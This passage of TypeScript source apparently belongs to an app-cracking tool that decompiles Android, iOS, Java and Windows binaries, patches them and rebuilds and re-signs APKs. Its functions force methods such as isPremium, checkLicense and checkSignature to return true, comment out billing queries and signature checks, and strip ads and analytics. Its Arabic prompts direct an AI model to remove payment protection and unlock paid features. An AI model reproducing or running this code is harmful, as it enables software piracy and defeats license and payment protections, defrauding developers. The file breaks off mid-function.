export async function decompileFileForEdit(fileBuffer: Buffer, fileName: string): Promise<{
  success: boolean;
  sessionId: string;
  files: DecompiledFile[];
  structure: FileTreeNode[];
  usedApkTool: boolean;
  fileType: string;
  error?: string;
}> {
  const ext = (fileName.split(".").pop()?.toLowerCase() || "bin") as EditSession["fileType"];

  if (ext === "apk") {
    const result = await decompileAPKForEdit(fileBuffer, fileName);
    return { ...result, fileType: "apk" };
  }

  // IPA/JAR/AAR/DEX: use ZIP-based edit (text files editable)
  if (ext === "ipa") {
    const result = await analyzeIPA(fileBuffer, fileName);
    // Fall through to generic session handler
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }
  if (ext === "jar" || ext === "aar") {
    const result = await analyzeJAR(fileBuffer, fileName, ext);
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }
  if (ext === "dex") {
    const result = await analyzeDEX(fileBuffer, fileName);
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }
  if (ext === "so" || ext === "elf") {
    const result = await analyzeELF(fileBuffer, fileName);
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }
  if (ext === "ex5") {
    const result = await analyzeEX5(fileBuffer, fileName);
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }
  if (ext === "wasm") {
    const result = await analyzeWASM(fileBuffer, fileName);
    if (!result.success) return { success: false, sessionId: "", files: [], structure: [], usedApkTool: false, fileType: ext, error: result.error };
    return buildAnalysisEditSession(result, fileBuffer, fileName, ext);
  }

  // For EX4, EXE, DLL: analyze and store in session
  const sessionId = `edit-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const sessionDir = path.join(os.tmpdir(), `hayo-edit-${sessionId}`);
  const decompDir = path.join(sessionDir, "decompiled");

  try {
    fs.mkdirSync(decompDir, { recursive: true });

    // Get analysis result
    let analysisResult: DecompileResult;
    if (ext === "ex4") {
      analysisResult = await analyzeEX4(fileBuffer, fileName);
    } else {
      analysisResult = await analyzeEXE(fileBuffer, fileName);
    }

    if (!analysisResult.success) {
      throw new Error(analysisResult.error || "فشل التحليل");
    }

    // Write all text files to decompDir
    const files: DecompiledFile[] = [];
    for (const f of analysisResult.files) {
      if (f.content !== undefined) {
        const fullPath = path.join(decompDir, f.path);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        fs.writeFileSync(fullPath, f.content, "utf-8");
        files.push({ ...f, content: undefined }); // don't send content in response
      }
    }

    // Store originals for revert
    const originalContents = new Map<string, string>();
    for (const f of analysisResult.files) {
      if (f.content !== undefined) originalContents.set(f.path, f.content);
    }

    editSessions.set(sessionId, {
      dir: sessionDir,
      decompDir,
      apkPath: path.join(sessionDir, "original." + ext),
      fileType: ext,
      originalName: fileName,
      originalContents,
      modifiedPaths: new Set(),
      expiresAt: Date.now() + 30 * 60 * 1000,
    });

    // Write original file too
    fs.writeFileSync(path.join(sessionDir, "original." + ext), fileBuffer);

    return {
      success: true,
      sessionId,
      files,
      structure: buildFileTree(analysisResult.files),
      usedApkTool: false,
      fileType: ext,
    };
  } catch (err: any) {
    cleanupDir(sessionDir);
    return {
      success: false,
      sessionId: "",
      files: [],
      structure: [],
      usedApkTool: false,
      fileType: ext,
      error: `فشل التحليل للتحرير: ${err.message}`,
    };
  }
}

export function revertFile(sessionId: string, filePath: string): { success: boolean; originalContent?: string; error?: string } {
  const session = editSessions.get(sessionId);
  if (!session) return { success: false, error: "الجلسة غير موجودة" };
  const original = session.originalContents.get(filePath);
  if (original === undefined) return { success: false, error: "لا يوجد نسخة أصلية" };
  const fullPath = path.join(session.decompDir, filePath);
  try {
    fs.writeFileSync(fullPath, original, "utf-8");
    session.modifiedPaths.delete(filePath);
    return { success: true, originalContent: original };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

// ════════════════════════════════════════
// AI Modify Code
// ════════════════════════════════════════

export async function aiModifyCode(
  code: string,
  instruction: string,
  fileName: string
): Promise<{ modifiedCode: string; explanation: string }> {
  const result = await callOfficeAI(
    `أنت خبير هندسة عكسية لتطبيقات Android. مهمتك تعديل كود smali أو XML حسب تعليمات المستخدم.

قواعد صارمة:
- أعد الكود المعدّل بالكامل (ليس فقط الجزء المعدّل)
- لا تكسر بنية الكود — حافظ على كل التعريفات والـ registers
- إذا طُلب إزالة حماية الدفع: غيّر الشرط ليرجع true دائماً
- إذا طُلب تعديل نص: عدّل في ملف strings.xml المناسب
- إذا طُلب إزالة إعلانات: احذف أو علّق الكود المعني

أعد الإجابة بتنسيق JSON فقط:
{
  "modifiedCode": "الكود المعدّل بالكامل هنا",
  "explanation": "شرح ما تم تعديله ولماذا"
}`,
    `الملف: ${fileName}\n\nالتعليمات: ${instruction}\n\nالكود الحالي:\n\`\`\`\n${code.substring(0, 20000)}\n\`\`\``,
    8192,
    "claude-sonnet-4-6"
  );

  try {
    const cleaned = result.replace(/```json\n?/g, "").replace(/```\n?/g, "").trim();
    const jsonMatch = cleaned.match(/\{[\s\S]*\}/);
    if (jsonMatch) return JSON.parse(jsonMatch[0]);
  } catch { /* fallback */ }

  return { modifiedCode: code, explanation: "فشل التعديل التلقائي.\n" + result };
}

// ════════════════════════════════════════
// AI Search Files
// ════════════════════════════════════════

function extractSearchKeywords(query: string): string[] {
  const mapping: Record<string, string[]> = {
    "دفع": ["purchase", "billing", "pay", "premium", "subscribe", "isPaid", "isPremium", "isSubscribed", "isBought"],
    "مدفوع": ["premium", "paid", "pro", "subscribe", "purchase", "billing"],
    "مجاني": ["free", "trial", "premium", "paid"],
    "إعلان": ["ads", "adview", "admob", "banner", "interstitial", "adunit", "advertisement"],
    "إعلانات": ["ads", "adview", "admob", "banner", "interstitial", "adunit"],
    "تسجيل": ["login", "signin", "auth", "register", "account"],
    "صلاحية": ["permission", "license", "check", "verify", "validate"],
    "حماية": ["security", "protect", "guard", "check", "license", "verify"],
    "رخصة": ["license", "key", "serial", "activation", "validate"],
    "اشتراك": ["subscribe", "subscription", "premium", "billing", "purchase"],
    "مصادقة": ["auth", "authenticate", "token", "login", "verify"],
    "شبكة": ["network", "http", "url", "api", "request", "socket"],
  };

  const keywords: string[] = [];
  const lowerQuery = query.toLowerCase();

  for (const [arabic, english] of Object.entries(mapping)) {
    if (lowerQuery.includes(arabic)) keywords.push(...english);
  }

  const englishWords = query.match(/[a-zA-Z]{3,}/g);
  if (englishWords) keywords.push(...englishWords);

  if (keywords.length === 0) {
    keywords.push("premium", "purchase", "billing", "paid", "subscribe", "license");
  }

  return [...new Set(keywords)];
}

export async function aiSearchFiles(
  sessionId: string,
  query: string
): Promise<{ results: Array<{ path: string; snippet: string; relevance: string }> }> {
  const session = editSessions.get(sessionId);
  if (!session) throw new Error("الجلسة غير موجودة");

  const keywords = extractSearchKeywords(query);
  const matchingFiles: Array<{ path: string; content: string; matchCount: number }> = [];

  const allFiles = readDirRecursive(session.decompDir);
  for (const filePath of allFiles) {
    const ext = path.extname(filePath).toLowerCase();
    if (![".smali", ".xml", ".json", ".txt", ".properties"].includes(ext)) continue;

    try {
      const stat = fs.statSync(filePath);
      if (stat.size > 200000) continue;

      const content = fs.readFileSync(filePath, "utf-8");
      let matchCount = 0;
      for (const kw of keywords) {
        const regex = new RegExp(kw, "gi");
        const matches = content.match(regex);
        if (matches) matchCount += matches.length;
      }

      if (matchCount > 0) {
        matchingFiles.push({
          path: path.relative(session.decompDir, filePath),
          content: content.substring(0, 3000),
          matchCount,
        });
      }
    } catch { /* skip */ }
  }

  matchingFiles.sort((a, b) => b.matchCount - a.matchCount);
  const top10 = matchingFiles.slice(0, 10);

  if (top10.length === 0) {
    return { results: [{ path: "—", snippet: "لم يتم العثور على نتائج", relevance: "لا شيء" }] };
  }

  const aiResult = await callOfficeAI(
    "أنت خبير هندسة عكسية. حلل نتائج البحث وحدد الملفات الأكثر صلة بطلب المستخدم.",
    `طلب المستخدم: "${query}"\n\nالملفات المطابقة:\n${top10.map(f => `\n--- ${f.path} (${f.matchCount} تطابق) ---\n${f.content.substring(0, 400)}`).join("\n")}\n\nأعد JSON فقط:\n[{"path":"مسار الملف","snippet":"السطور المهمة","relevance":"لماذا هذا الملف مهم"}]`,
    4096,
    "claude-haiku-4-5"
  );

  try {
    const cleaned = aiResult.replace(/```json\n?/g, "").replace(/```\n?/g, "").trim();
    const parsed = JSON.parse(cleaned);
    return { results: Array.isArray(parsed) ? parsed : [parsed] };
  } catch {
    return {
      results: top10.slice(0, 5).map(f => ({
        path: f.path,
        snippet: `${f.matchCount} تطابقات`,
        relevance: "تطابق كلمات مفتاحية",
      })),
    };
  }
}

// ════════════════════════════════════════
// Rebuild APK
// ════════════════════════════════════════

export async function rebuildAPK(sessionId: string): Promise<{
  success: boolean;
  apkBuffer?: Buffer;
  usedApkTool: boolean;
  signed: boolean;
  error?: string;
}> {
  const session = editSessions.get(sessionId);
  if (!session) return { success: false, usedApkTool: false, signed: false, error: "الجلسة غير موجودة أو منتهية" };

  const outputApk = path.join(session.dir, "rebuilt.apk");
  const signedApk = path.join(session.dir, "signed.apk");
  const alignedApk = path.join(session.dir, "aligned.apk");
  const keystorePath = ensureKeystore();

  const apktoolPath = findApkTool();
  if (apktoolPath) {
    try {
      const apkCmd = buildApkToolCmd(apktoolPath, `b "${session.decompDir}" -o "${outputApk}" --use-aapt2`);
      try {
        execSync(apkCmd, { timeout: 600000, stdio: "pipe" });
      } catch (buildErr: any) {
        if (!fs.existsSync(outputApk)) {
          console.warn("[RE] APKTool --use-aapt2 failed, trying without...");
          try {
            execSync(
              buildApkToolCmd(apktoolPath, `b "${session.decompDir}" -o "${outputApk}"`),
              { timeout: 600000, stdio: "pipe" }
            );
          } catch (buildErr2: any) {
            if (!fs.existsSync(outputApk)) throw buildErr2;
            console.warn("[RE] APKTool rebuild had warnings but produced output");
          }
        }
      }

      if (!fs.existsSync(outputApk)) {
        throw new Error("فشل إنشاء APK");
      }

      let signed = false;
      const uberSigner = findApkSigner();

      if (uberSigner) {
        try {
          execSync(
            `java -jar "${uberSigner}" -a "${outputApk}" -o "${session.dir}" --allowResign --overwrite --ksDebug "${keystorePath}"`,
            { timeout: 300000, stdio: "pipe" }
          );
          const signedFiles = fs.readdirSync(session.dir)
            .filter((f: string) => (f.includes("Signed") || f.includes("signed")) && f.endsWith(".apk"))
            .sort((a: string, b: string) => b.length - a.length);
          if (signedFiles.length > 0) {
            fs.copyFileSync(path.join(session.dir, signedFiles[0]), signedApk);
            signed = true;
          }
        } catch (e: any) {
          console.warn("[RE] uber-apk-signer failed:", e.message?.slice(0, 200));
        }
      }

      if (!signed) {
        try {
          execSync(`zipalign -f 4 "${outputApk}" "${alignedApk}"`, { timeout: 60000, stdio: "pipe" });
        } catch {
          fs.copyFileSync(outputApk, alignedApk);
        }

        signed = signWithJarsigner(alignedApk);
        if (signed) {
          fs.copyFileSync(alignedApk, signedApk);
        } else {
          fs.copyFileSync(outputApk, signedApk);
        }
      }

      const apkBuffer = fs.readFileSync(signedApk);
      return { success: true, apkBuffer, usedApkTool: true, signed };
    } catch (err: any) {
      console.warn("[RE] APKTool rebuild failed:", err.message);
    }
  }

  // Fallback: ZIP rebuild (repack modified files)
  try {
    const zip = new JSZip();
    const allFiles = readDirRecursive(session.decompDir);
    for (const filePath of allFiles) {
      const relPath = path.relative(session.decompDir, filePath);
      const data = fs.readFileSync(filePath);
      zip.file(relPath, data);
    }
    const apkBuffer = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
    return { success: true, apkBuffer, usedApkTool: false, signed: false };
  } catch (err: any) {
    return { success: false, usedApkTool: false, signed: false, error: `فشل إعادة البناء: ${err.message}` };
  }
}

// ════════════════════════════════════════════════════════════════
// Smart AI Modify — AI finds the right files automatically
// User just says what they want, AI locates and modifies
// ════════════════════════════════════════════════════════════════

export async function aiSmartModify(
  sessionId: string,
  instruction: string,
  _targetFiles?: string[]
): Promise<{
  modifications: Array<{ filePath: string; explanation: string; originalSnippet: string; modifiedSnippet: string }>;
  summary: string;
  filesModified: number;
}> {
  const session = editSessions.get(sessionId);
  if (!session) throw new Error("الجلسة غير موجودة أو منتهية");

  // Step 1: Gather all text files with their content (limited)
  const allFiles = readDirRecursive(session.decompDir);
  const textFiles: Array<{ relPath: string; content: string }> = [];
  let totalChars = 0;
  const MAX_CONTEXT = 120000; // ~30K tokens

  for (const filePath of allFiles) {
    const ext = path.extname(filePath).toLowerCase();
    if (![".smali", ".xml", ".json", ".txt", ".properties", ".java", ".kt", ".js", ".html", ".yml", ".yaml", ".cfg", ".ini", ".pro"].includes(ext)) continue;
    try {
      const stat = fs.statSync(filePath);
      if (stat.size > 300000 || stat.size === 0) continue;
      const content = fs.readFileSync(filePath, "utf-8");
      const relPath = path.relative(session.decompDir, filePath);
      if (totalChars + content.length > MAX_CONTEXT) {
        textFiles.push({ relPath, content: content.substring(0, 2000) + "\n... [truncated]" });
        totalChars += 2000;
      } else {
        textFiles.push({ relPath, content });
        totalChars += content.length;
      }
    } catch { /* skip */ }
  }

  // Step 2: Ask AI to find and modify
  const filesIndex = textFiles.map((f, i) => `[${i}] ${f.relPath} (${f.content.length} chars)`).join("\n");

  const planResult = await callPowerAI(
    `أنت خبير هندسة عكسية محترف لتطبيقات Android/Windows/iOS. مهمتك:
1. فهم طلب المستخدم
2. البحث في ملفات التطبيق المفكك وتحديد الملفات التي تحتاج تعديل
3. تنفيذ التعديلات المطلوبة

قواعد صارمة:
- ابحث في كل الملفات واختر الملفات الصحيحة تلقائياً
- عدّل فقط الملفات التي تحتاج تعديل فعلاً
- حافظ على بنية الكود (خصوصاً smali)
- لملفات smali: حافظ على كل registers و labels
- لإزالة الإعلانات: ابحث عن admob/ads/banner/interstitial وعطّلها
- لفتح الميزات المدفوعة: غيّر الشروط لترجع true
- لتغيير اسم التطبيق: عدّل strings.xml
- لإزالة التراخيص: ابحث عن license/check/verify

أعد JSON فقط بهذا التنسيق:
{
  "modifications": [
    {
      "fileIndex": 0,
      "filePath": "path/to/file.smali",
      "searchText": "النص الأصلي الذي يجب البحث عنه واستبداله",
      "replaceText": "النص البديل",
      "explanation": "شرح التعديل"
    }
  ],
  "summary": "ملخص كل التعديلات"
}`,
    `التعليمات: ${instruction}\n\nالملفات المتاحة:\n${filesIndex}\n\n${"=".repeat(60)}\n\nمحتوى الملفات:\n${textFiles.map((f, i) => `\n${"═".repeat(40)}\n[${i}] ${f.relPath}\n${"═".repeat(40)}\n${f.content}`).join("\n")}`,
    32000
  );

  // Step 3: Parse AI response and apply modifications
  const modifications: Array<{ filePath: string; explanation: string; originalSnippet: string; modifiedSnippet: string }> = [];

  try {
    const cleaned = planResult.content.replace(/```json\n?/g, "").replace(/```\n?/g, "").trim();
    const jsonMatch = cleaned.match(/\{[\s\S]*\}/);
    if (!jsonMatch) throw new Error("No JSON found");

    const plan = JSON.parse(jsonMatch[0]);

    for (const mod of plan.modifications || []) {
      const fileInfo = textFiles[mod.fileIndex] || textFiles.find(f => f.relPath === mod.filePath);
      if (!fileInfo) continue;

      const fullPath = path.join(session.decompDir, fileInfo.relPath);
      if (!fs.existsSync(fullPath)) continue;

      try {
        let content = fs.readFileSync(fullPath, "utf-8");
        const original = content;

        if (mod.searchText && mod.replaceText !== undefined) {
          if (content.includes(mod.searchText)) {
            content = content.replace(mod.searchText, mod.replaceText);
            fs.writeFileSync(fullPath, content, "utf-8");

            // Track modification in session
            if (!session.modifiedPaths) session.modifiedPaths = new Set();
            session.modifiedPaths.add(fileInfo.relPath);

            modifications.push({
              filePath: fileInfo.relPath,
              explanation: mod.explanation || "تعديل تلقائي",
              originalSnippet: mod.searchText.substring(0, 200),
              modifiedSnippet: mod.replaceText.substring(0, 200),
            });
          }
        }
      } catch { /* skip file */ }
    }

    return {
      modifications,
      summary: plan.summary || `تم تعديل ${modifications.length} ملفات`,
      filesModified: modifications.length,
    };
  } catch (err: any) {
    // If AI response parsing failed, return raw
    return {
      modifications: [],
      summary: `فشل تحليل استجابة AI: ${err.message}\n\nالاستجابة الخام:\n${planResult.content.substring(0, 500)}`,
      filesModified: 0,
    };
  }
}

// ════════════════════════════════════════════════════════════════
// Direct Pattern-Based Restriction Breakers
// Multi-format: APK(smali/xml), JAR/AAR(java/kt), EXE/DLL(strings/asm),
// IPA(swift/objc/plist), WASM(wat), EX4/EX5(mql), SO/ELF(c/cpp)
// ════════════════════════════════════════════════════════════════

const EDITABLE_EXTS = [
  ".smali", ".xml", ".json", ".txt", ".properties", ".java", ".kt",
  ".js", ".ts", ".html", ".css", ".swift", ".m", ".h", ".c", ".cpp",
  ".py", ".rb", ".yml", ".yaml", ".cfg", ".ini", ".pro", ".gradle",
  ".mf", ".sf", ".plist", ".strings", ".mq4", ".mq5", ".wat",
  ".cs", ".vb", ".il", ".asm",
];

function walkEditableFiles(decompDir: string, maxSize = 500000): Array<{ path: string; relPath: string; ext: string }> {
  const results: Array<{ path: string; relPath: string; ext: string }> = [];
  const allFiles = readDirRecursive(decompDir);
  for (const filePath of allFiles) {
    const ext = path.extname(filePath).toLowerCase();
    if (!EDITABLE_EXTS.includes(ext)) continue;
    try {
      const stat = fs.statSync(filePath);
      if (stat.size > maxSize || stat.size === 0) continue;
      results.push({ path: filePath, relPath: path.relative(decompDir, filePath), ext });
    } catch { /* skip */ }
  }
  return results;
}

function directRemoveAds(decompDir: string): string[] {
  const mods: string[] = [];
  const files = walkEditableFiles(decompDir);

  for (const { path: filePath, relPath, ext } of files) {
    try {
      let content = fs.readFileSync(filePath, "utf-8");
      let changed = false;
      const original = content;

      if (ext === ".smali") {
        // Android smali: disable ad SDK calls
        content = content.replace(
          /invoke-[a-z]+\s+\{[^}]*\},\s*L(com\/google\/android\/gms\/ads|com\/google\/ads|com\/facebook\/ads|com\/unity3d\/ads|com\/applovin|com\/ironsource|com\/mopub|com\/inmobi|com\/startapp)[^\n]*/gi,
          (m) => `# [HAYO-AD-REMOVED] ${m}`
        );
        content = content.replace(/(invoke-[^\n]*(?:loadAd|showAd|showInterstitial|loadInterstitial|loadBanner|showBanner|loadRewardedAd|showRewardedAd)[^\n]*)/gi,
          (m) => `# [HAYO-AD-DISABLED] ${m}`
        );
      } else if ([".java", ".kt", ".cs"].includes(ext)) {
        // Java/Kotlin/C#: comment out ad imports and calls
        content = content.replace(/^(import\s+.*(?:admob|ads|adview|interstitial|banner|AdMob|AppLovin|IronSource|UnityAds|MoPub).*)$/gim,
          (m) => `// [HAYO-AD-REMOVED] ${m}`
        );
        content = content.replace(/(.*(?:loadAd|showAd|loadInterstitial|showInterstitial|adView|adRequest|AdRequest|MobileAds|InterstitialAd|BannerView|RewardedAd)\s*[\(\.].*)/gi,
          (m) => `// [HAYO-AD-DISABLED] ${m}`
        );
      } else if ([".swift", ".m"].includes(ext)) {
        // iOS Swift/ObjC: disable ad SDK calls
        content = content.replace(/^(import\s+.*(?:GoogleMobileAds|AdSupport|AppTrackingTransparency|FBAudience).*)$/gim,
          (m) => `// [HAYO-AD-REMOVED] ${m}`
        );
        content = content.replace(/(.*(?:GAD|ADBanner|GADInterstitial|GADRewardedAd|FBAdView|FBInterstitial)\s*[\(\.].*)/gi,
          (m) => `// [HAYO-AD-DISABLED] ${m}`
        );
      } else if ([".js", ".ts"].includes(ext)) {
        // Web/React Native/Electron
        content = content.replace(/(.*(?:admob|adsense|adsbygoogle|googletag|adUnit|showAd|loadAd|interstitialAd|bannerAd)\s*[\(\.\=].*)/gi,
          (m) => `// [HAYO-AD-DISABLED] ${m}`
        );
      } else if (ext === ".xml" || ext === ".plist") {
        // Remove ad-related XML elements
        content = content.replace(/<[^>]*(?:com\.google\.ads|admob|ad_unit|adView|AdView|banner_ad|interstitial_ad)[^>]*\/>/gi, "<!-- [HAYO-AD-REMOVED] -->");
        content = content.replace(/<[^>]*(?:com\.google\.ads|admob|ad_unit)[^>]*>[\s\S]*?<\/[^>]*>/gi, "<!-- [HAYO-AD-REMOVED] -->");
      }

      if (content !== original) {
        changed = true;
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`🚫 إعلانات: ${relPath}`);
      }
    } catch { /* skip */ }
  }

  // Remove ad permissions from manifests
  for (const manifestName of ["AndroidManifest.xml", "Info.plist"]) {
    const manifestPath = path.join(decompDir, manifestName);
    if (fs.existsSync(manifestPath)) {
      try {
        let manifest = fs.readFileSync(manifestPath, "utf-8");
        const adPerms = ["com.google.android.gms.permission.AD_ID", "com.google.android.gms.ads", "NSUserTrackingUsageDescription", "GADApplicationIdentifier"];
        for (const perm of adPerms) {
          if (manifest.includes(perm)) {
            manifest = manifest.replace(new RegExp(`<[^>]*${perm.replace(/\./g, "\\.")}[^>]*>[^<]*</[^>]*>|<[^>]*${perm.replace(/\./g, "\\.")}[^>]*/>`, "g"), "");
            mods.push(`🚫 صلاحية: ${perm}`);
          }
        }
        fs.writeFileSync(manifestPath, manifest, "utf-8");
      } catch { /* skip */ }
    }
  }

  return mods;
}

function directUnlockPremium(decompDir: string): string[] {
  const mods: string[] = [];
  const files = walkEditableFiles(decompDir);

  const premiumMethodNames = ["isPremium", "isPaid", "isSubscribed", "isPro", "isVip", "hasPurchased", "isUnlocked", "isBought", "checkLicense", "isTrialExpired", "isFreeTier", "needsUpgrade", "shouldShowPaywall", "canAccessFeature", "hasActiveSubscription"];

  for (const { path: filePath, relPath, ext } of files) {
    try {
      let content = fs.readFileSync(filePath, "utf-8");
      let changed = false;
      const original = content;

      if (ext === ".smali") {
        // Smali: patch boolean-returning premium methods
        const methodRegex = new RegExp(
          `\\.method[^\\n]*(${premiumMethodNames.join("|")})[^\\n]*\\n([\\s\\S]*?)\\.end method`, "g"
        );
        content = content.replace(methodRegex, (match, methodName) => {
          const header = match.split("\n")[0];
          if (/\babstract\b/i.test(header) || /\bnative\b/i.test(header)) return match;
          const returnsBoolean = header.includes(")Z") || header.includes(")I");
          if (returnsBoolean) {
            const isNegative = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(methodName);
            const val = isNegative ? "0x0" : "0x1";
            return `${header}\n    .locals 1\n    # [HAYO-UNLOCKED] ${methodName} → ${isNegative ? "false" : "true"}\n    const/4 v0, ${val}\n    return v0\n.end method`;
          }
          return match;
        });
        // Bypass billing queries
        content = content.replace(/(invoke-[^\n]*(?:queryPurchases|getPurchaseState|getResponseCode|launchBillingFlow|acknowledgePurchase)[^\n]*)/gi,
          (m) => `# [HAYO-BILLING-BYPASS] ${m}`
        );
      } else if ([".java", ".kt"].includes(ext)) {
        // Java/Kotlin: patch return statements in premium methods
        for (const method of premiumMethodNames) {
          const regex = new RegExp(`((?:public|private|protected|internal)?\\s*(?:static\\s+)?(?:fun|boolean|Bool)\\s+${method}\\s*\\([^)]*\\)\\s*(?::\\s*Boolean)?\\s*\\{)([\\s\\S]*?)(\\})`, "g");
          content = content.replace(regex, (match, header, body, close) => {
            changed = true;
            const isNegative = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(method);
            return `${header}\n    // [HAYO-UNLOCKED] ${method}\n    return ${isNegative ? "false" : "true"};\n${close}`;
          });
        }
      } else if ([".swift", ".m"].includes(ext)) {
        // Swift/ObjC: patch premium checks
        for (const method of premiumMethodNames) {
          const regex = new RegExp(`(func\\s+${method}\\s*\\([^)]*\\)\\s*->\\s*Bool\\s*\\{)([\\s\\S]*?)(\\})`, "g");
          content = content.replace(regex, (match, header, body, close) => {
            changed = true;
            const isNegative = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(method);
            return `${header}\n    // [HAYO-UNLOCKED] ${method}\n    return ${isNegative ? "false" : "true"}\n${close}`;
          });
        }
      } else if ([".js", ".ts"].includes(ext)) {
        // JavaScript/TypeScript
        for (const method of premiumMethodNames) {
          const regex = new RegExp(`((?:async\\s+)?(?:function\\s+)?${method}\\s*\\([^)]*\\)\\s*(?::\\s*boolean)?\\s*\\{)([\\s\\S]*?)(\\})`, "gi");
          content = content.replace(regex, (match, header, body, close) => {
            changed = true;
            const isNegative = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(method);
            return `${header}\n    // [HAYO-UNLOCKED] ${method}\n    return ${isNegative ? "false" : "true"};\n${close}`;
          });
        }
      } else if (ext === ".cs") {
        // C# (.NET)
        for (const method of premiumMethodNames) {
          const regex = new RegExp(`((?:public|private|protected|internal)?\\s*(?:static\\s+)?bool\\s+${method}\\s*\\([^)]*\\)\\s*\\{)([\\s\\S]*?)(\\})`, "g");
          content = content.replace(regex, (match, header, body, close) => {
            changed = true;
            const isNegative = /Expired|FreeTier|needsUpgrade|shouldShowPaywall/i.test(method);
            return `${header}\n    // [HAYO-UNLOCKED] ${method}\n    return ${isNegative ? "false" : "true"};\n${close}`;
          });
        }
      }

      if (content !== original) {
        changed = true;
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`🔓 مدفوع: ${relPath}`);
      }
    } catch { /* skip */ }
  }

  return mods;
}

function directRemoveTracking(decompDir: string): string[] {
  const mods: string[] = [];
  const files = walkEditableFiles(decompDir);
  const trackingPatterns = [
    /(?:Firebase|Analytics|Crashlytics|logEvent|setAnalytics|trackEvent|sendEvent|Amplitude|Mixpanel|Segment|Flurry|AppsFly|Adjust|Branch|CleverTap|OneSignal)/gi,
  ];

  for (const { path: filePath, relPath, ext } of files) {
    try {
      let content = fs.readFileSync(filePath, "utf-8");
      const original = content;

      if (ext === ".smali") {
        content = content.replace(/(invoke-[^\n]*(?:Firebase|Analytics|Crashlytics|logEvent|trackEvent|Amplitude|Mixpanel|Flurry|Adjust|Branch)[^\n]*)/gi,
          (m) => `# [HAYO-TRACKING-OFF] ${m}`);
      } else if ([".java", ".kt", ".swift", ".m", ".js", ".ts", ".cs"].includes(ext)) {
        content = content.replace(/(.*(?:logEvent|trackEvent|sendAnalytics|setUserProperty|recordEvent|trackScreen|setCurrentScreen|logCustom|analytics\.track|analytics\.log)\s*\(.*)/gi,
          (m) => `// [HAYO-TRACKING-OFF] ${m}`);
        content = content.replace(/^(import\s+.*(?:Firebase|Analytics|Crashlytics|Amplitude|Mixpanel|Flurry|Adjust).*)$/gim,
          (m) => `// [HAYO-TRACKING-OFF] ${m}`);
      }

      if (content !== original) {
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`📡 تتبع: ${relPath}`);
      }
    } catch { /* skip */ }
  }

  return mods;
}

function directRemoveLicenseCheck(decompDir: string): string[] {
  const mods: string[] = [];
  const files = walkEditableFiles(decompDir);
  const licenseMethodNames = ["checkLicense", "verifyLicense", "validateLicense", "isLicensed", "isActivated", "checkSignature", "verifySignature", "isRegistered", "isExpired", "checkExpiry", "validateKey", "verifyKey", "checkSerial"];

  for (const { path: filePath, relPath, ext } of files) {
    try {
      let content = fs.readFileSync(filePath, "utf-8");
      const original = content;

      if (ext === ".smali") {
        const regex = new RegExp(
          `\\.method[^\\n]*(${licenseMethodNames.join("|")})[^\\n]*\\n([\\s\\S]*?)\\.end method`, "g"
        );
        content = content.replace(regex, (match, methodName) => {
          const header = match.split("\n")[0];
          if (/\babstract\b/i.test(header) || /\bnative\b/i.test(header)) return match;
          const isNegative = /Expired|isExpired|checkExpiry/i.test(methodName);
          const val = isNegative ? "0x0" : "0x1";
          return `${header}\n    .locals 1\n    # [HAYO-LICENSE-BYPASS] ${methodName}\n    const/4 v0, ${val}\n    return v0\n.end method`;
        });
        content = content.replace(/(invoke-[^\n]*(?:PackageManager|checkSignature|getPackageInfo.*signatures)[^\n]*)/gi,
          (m) => `# [HAYO-SIG-BYPASS] ${m}`);
      } else if ([".java", ".kt"].includes(ext)) {
        for (const method of licenseMethodNames) {
          const regex = new RegExp(`((?:public|private|protected)?\\s*(?:static\\s+)?(?:fun|boolean)\\s+${method}\\s*\\([^)]*\\)\\s*(?::\\s*Boolean)?\\s*\\{)([\\s\\S]*?)(\\})`, "g");
          content = content.replace(regex, (match, header, body, close) => {
            const isNeg = /Expired/i.test(method);
            return `${header}\n    // [HAYO-LICENSE-BYPASS] ${method}\n    return ${isNeg ? "false" : "true"};\n${close}`;
          });
        }
      } else if ([".swift", ".m"].includes(ext)) {
        for (const method of licenseMethodNames) {
          const regex = new RegExp(`(func\\s+${method}\\s*\\([^)]*\\)\\s*->\\s*Bool\\s*\\{)([\\s\\S]*?)(\\})`, "g");
          content = content.replace(regex, (match, header, body, close) => {
            const isNeg = /Expired/i.test(method);
            return `${header}\n    // [HAYO-LICENSE-BYPASS]\n    return ${isNeg ? "false" : "true"}\n${close}`;
          });
        }
      } else if ([".js", ".ts", ".cs"].includes(ext)) {
        for (const method of licenseMethodNames) {
          const regex = new RegExp(`((?:async\\s+)?(?:function\\s+)?(?:bool\\s+)?${method}\\s*\\([^)]*\\)\\s*(?::\\s*(?:boolean|Bool))?\\s*\\{)([\\s\\S]*?)(\\})`, "gi");
          content = content.replace(regex, (match, header, body, close) => {
            const isNeg = /Expired/i.test(method);
            return `${header}\n    // [HAYO-LICENSE-BYPASS]\n    return ${isNeg ? "false" : "true"};\n${close}`;
          });
        }
      }

      if (content !== original) {
        fs.writeFileSync(filePath, content, "utf-8");
        mods.push(`🔑 رخصة: ${relPath}`);
      }
    } catch { /* skip */ }
  }

  return mods;
}

function directChangeAppName(decompDir: string, newName: string): string[] {
  const mods: string[] = [];
